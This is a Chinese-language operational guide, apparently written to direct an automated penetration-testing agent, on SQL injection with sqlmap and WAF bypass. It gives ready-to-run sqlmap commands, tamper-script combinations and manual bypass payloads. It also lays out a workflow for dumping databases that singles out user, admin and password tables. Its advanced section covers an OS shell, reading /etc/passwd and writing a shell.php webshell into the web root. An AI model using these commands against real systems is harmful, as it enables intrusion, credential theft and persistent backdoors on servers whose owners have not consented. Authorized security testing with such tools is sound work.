# WAF 绕过与 sqlmap 高级用法

## ⛔ sqlmap 超时控制（必须遵守！）

sqlmap 扫描可能运行很长时间。**必须使用 timeout 包裹，最长 10 分钟**：

```bash
# ✅ 正确：用 timeout + tee 保留输出
timeout 480 sqlmap -u 'http://目标/page.php?id=1' --batch --random-agent --level 2 --risk 2 2>&1 | tee /tmp/sqlmap_output.log

# 超时后立即检查已有结果（可能已找到注入点）
echo "=== sqlmap 结果 ===" && tail -80 /tmp/sqlmap_output.log
```

- ⛔ **禁止**不加 timeout 直接运行 sqlmap
- ⛔ **禁止**用 `sleep N && tail` 轮询等待 sqlmap —— 这会浪费宝贵的轮次时间
- ✅ 超时后**必须** `tail` 查看输出，因为可能已经发现注入点
- ✅ 如果 sqlmap 10 分钟内无结果，切换手动注入测试

## sqlmap 自动化检测

调用 sqlmap（将目标 URL 替换为实际地址）:
```bash
timeout 480 sqlmap -u 'http://目标/page.php?id=1' --batch --random-agent --level 2 --risk 2 --technique BEUSTQ 2>&1 | tee /tmp/sqlmap_output.log
```
如遇 WAF，逐步升级:
```bash
timeout 480 sqlmap -u 'http://目标/page.php?id=1' --batch --tamper=space2comment,between --random-agent 2>&1 | tee /tmp/sqlmap_output.log
```

## WAF 绕过技巧

常用 tamper 脚本组合:
- 通用: `space2comment,between,randomcase`
- MySQL: `space2comment,equaltolike,greatest,halfversionedmorekeywords`
- MSSQL: `space2comment,between,charencode`

编码绕过: URL双编码、Unicode编码、十六进制编码

使用 aboutsecurity 字典库获取绕过 payload:
```bash
ls /pentest/AboutSecurity/Dic/SQL-Inj/
cat /pentest/AboutSecurity/Dic/SQL-Inj/bypass-waf.txt
```

## 手动 SQLi WAF 绕过 Payload

### 空格替代
```sql
UNION%09SELECT   -- Tab
UNION%0aSELECT   -- 换行
UNION/**/SELECT   -- 注释
UNION(SELECT 1,2,3)   -- 括号
```

### 函数替代
```sql
SUBSTRING → MID / SUBSTR / LEFT / RIGHT
CONCAT → CONCAT_WS / GROUP_CONCAT
IF → CASE WHEN ... THEN ... ELSE ... END
SLEEP → BENCHMARK(10000000, SHA1('a'))
```

### 编码函数
```sql
CHAR(65,66,67) 替代 'ABC'
0x414243 替代 'ABC'  -- 十六进制
```

## sqlmap 数据提取流程

1. 库名: `sqlmap --dbs`
2. 表名: `sqlmap -D dbname --tables`
3. 列名: `sqlmap -D dbname -T tablename --columns`
4. 数据: `sqlmap -D dbname -T tablename --dump`
5. 敏感信息: 关注 users/admin/password/config 等表

## 高级利用

- OS Shell: `sqlmap --os-shell`（需 FILE 权限 + 可写路径）
- 文件读取: `sqlmap --file-read=/etc/passwd`
- 文件写入: `sqlmap --file-write=shell.php --file-dest=/var/www/html/`
- DNS 带外: `sqlmap --dns-domain=your.dns.server`

## 注意事项
- 优先使用低风险技术（布尔盲注 > 时间盲注 > 报错注入）
- 避免使用 --risk 3（OR-based 可能修改数据）
- 大量数据提取使用 --threads 控制速率
- 保留原始请求和响应作为证据
